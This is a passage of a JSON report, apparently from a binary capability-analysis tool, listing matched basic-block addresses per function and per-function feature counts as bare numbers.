                    "type": "absolute",
                    "value": 6442647669
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442647694
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442647816
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442647825
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442648076
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442648084
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442648084
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442648303
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442649060
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442649392
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442649397
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442649494
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442649500
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442649500
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442650031
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442650244
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442650244
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442650266
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442650283
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442651916
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442651975
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442652026
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442652044
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442652068
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442652812
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442652812
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442652953
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442653037
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442653068
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442653169
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442653236
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442653351
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442653364
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442653445
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442653784
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442653784
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442653911
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442653942
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442653972
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442654054
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442654236
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442654236
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442654810
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442656304
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442656304
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442656349
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442656352
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442656560
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442656560
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442656637
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442656665
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442656677
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442656723
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442657528
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442657667
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442657756
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442657756
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442657844
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442657844
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442658030
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442658088
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442658156
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442658156
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442658332
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442658332
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442658513
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442658516
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442658595
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442658629
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442658635
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442658672
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442658731
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442658780
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442658988
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442659060
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442659208
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442659262
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442659366
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442659060
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442659060
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442659208
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442659262
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442659366
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442659476
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442659414
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442659476
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442659494
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442659534
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442659543
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442659656
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442659713
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442659556
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442659656
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442659713
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442659732
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442659774
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442659928
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442659928
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442660052
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442660157
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442660480
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442660514
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442660522
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442661284
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442661284
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442661536
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442661568
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442661568
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442661620
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442661620
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442661798
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442661919
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442662122
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442662146
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442662444
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442662628
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442662628
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442662864
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442665048
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442665193
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442665056
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442665193
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442665428
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442665505
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442667272
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442667435
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442667495
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442667581
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442667597
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442667646
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442667717
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442667748
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442667748
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442667800
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442667820
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442667920
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442667951
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442667976
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442667748
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442667800
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442667820
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442667920
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442667951
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442668256
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442668256
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442668279
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442668476
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442647146
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442668476
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442668534
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442668546
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442668568
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442668592
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442668633
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442668640
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442668683
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442668688
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442668688
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442668816
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442668900
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442668916
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442668916
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442668980
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442669050
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442669068
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442669068
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442669424
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442669608
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442669634
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442669704
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442669716
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442669724
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442669971
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442670218
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442670367
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442669724
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442669724
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442669971
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442670218
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442670367
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442670684
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442670792
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442670945
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442671120
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442671120
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442671504
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442671514
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442671529
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442671932
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442671984
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442672003
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442672014
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442672109
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442672154
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442672223
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442672238
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442672244
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442672267
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442672329
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442672334
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442672339
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442672480
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442672500
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442672560
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442672592
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442672639
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442672848
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442672885
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442672944
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442673080
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442673248
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442673384
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442673577
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442673614
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442673648
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442673756
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442673904
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442674144
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442674177
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442674227
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442674251
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442674284
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442674336
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442674381
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442674565
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442674578
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442674640
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442674714
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442674832
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442674906
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442675033
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442675046
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442675088
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442675150
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442680416
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442515628
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442515657
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442515681
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442680584
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442680584
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442680668
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442474672
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442474701
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442474815
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442474833
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442595242
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442680680
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442515628
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442515657
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442515681
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442680692
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442680692
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442680776
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442474672
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442474701
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442474815
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442474833
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442595242
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442680788
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442515628
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442515657
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442515681
                  }
                }
              ]
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442680864
              },
              "matched_basic_blocks": [
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442515628
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442515657
                  }
                },
                {
                  "address": {
                    "type": "absolute",
                    "value": 6442515681
                  }
                }
              ]
            }
          ]
        },
        "feature_counts": {
          "file": 3349,
          "functions": [
            {
              "address": {
                "type": "absolute",
                "value": 6442455040
              },
              "count": 23
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455096
              },
              "count": 27
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455144
              },
              "count": 36
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455224
              },
              "count": 19
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455280
              },
              "count": 23
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455312
              },
              "count": 27
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455440
              },
              "count": 16
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455512
              },
              "count": 23
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455544
              },
              "count": 23
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455576
              },
              "count": 22
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455600
              },
              "count": 7
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442455712
              },
              "count": 35
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442456096
              },
              "count": 31
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442456160
              },
              "count": 31
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442456224
              },
              "count": 13
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442456256
              },
              "count": 31
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442456464
              },
              "count": 117
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442457024
              },
              "count": 40
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442457200
              },
              "count": 7
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442457216
              },
              "count": 52
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442457472
              },
              "count": 31
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442457536
              },
              "count": 29
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442457856
              },
              "count": 67
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442458256
              },
              "count": 109
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442458272
              },
              "count": 40
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442458352
              },
              "count": 112
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442458368
              },
              "count": 40
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442458448
              },
              "count": 6
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442458640
              },
              "count": 73
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442458832
              },
              "count": 40
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442458992
              },
              "count": 99
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442459552
              },
              "count": 54
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442459776
              },
              "count": 271
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442463824
              },
              "count": 56
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442463968
              },
              "count": 108
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442465152
              },
              "count": 78
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442465392
              },
              "count": 107
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442465856
              },
              "count": 156
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442466672
              },
              "count": 56
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442466832
              },
              "count": 160
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442467680
              },
              "count": 50
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442467776
              },
              "count": 250
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442471264
              },
              "count": 16
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442471296
              },
              "count": 7
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442471312
              },
              "count": 33
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442471376
              },
              "count": 38
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442471488
              },
              "count": 46
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442471568
              },
              "count": 86
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442471872
              },
              "count": 78
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442472096
              },
              "count": 78
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442472368
              },
              "count": 68
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442472688
              },
              "count": 86
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442473120
              },
              "count": 124
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442474192
              },
              "count": 111
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442474608
              },
              "count": 21
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442474640
              },
              "count": 21
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442474672
              },
              "count": 79
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442474848
              },
              "count": 50
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442475088
              },
              "count": 132
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442475920
              },
              "count": 65
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442476224
              },
              "count": 74
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442476624
              },
              "count": 39
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442476848
              },
              "count": 103
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442477616
              },
              "count": 7
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442477680
              },
              "count": 53
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442477872
              },
              "count": 55
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442478240
              },
              "count": 90
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442478624
              },
              "count": 64
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442478896
              },
              "count": 68
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442479376
              },
              "count": 64
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442479856
              },
              "count": 62
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442480368
              },
              "count": 161
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442481136
              },
              "count": 157
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442481904
              },
              "count": 113
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442482176
              },
              "count": 113
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442482448
              },
              "count": 107
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442482704
              },
              "count": 107
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442482960
              },
              "count": 120
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442483776
              },
              "count": 51
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442483984
              },
              "count": 8
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442484368
              },
              "count": 108
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442484624
              },
              "count": 99
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442484880
              },
              "count": 172
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442485648
              },
              "count": 114
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442486032
              },
              "count": 48
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442486224
              },
              "count": 37
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442486288
              },
              "count": 37
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442486352
              },
              "count": 36
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442488192
              },
              "count": 94
            },
            {
              "address": {
                "type": "absolute",
                "value": 6442488720
              },
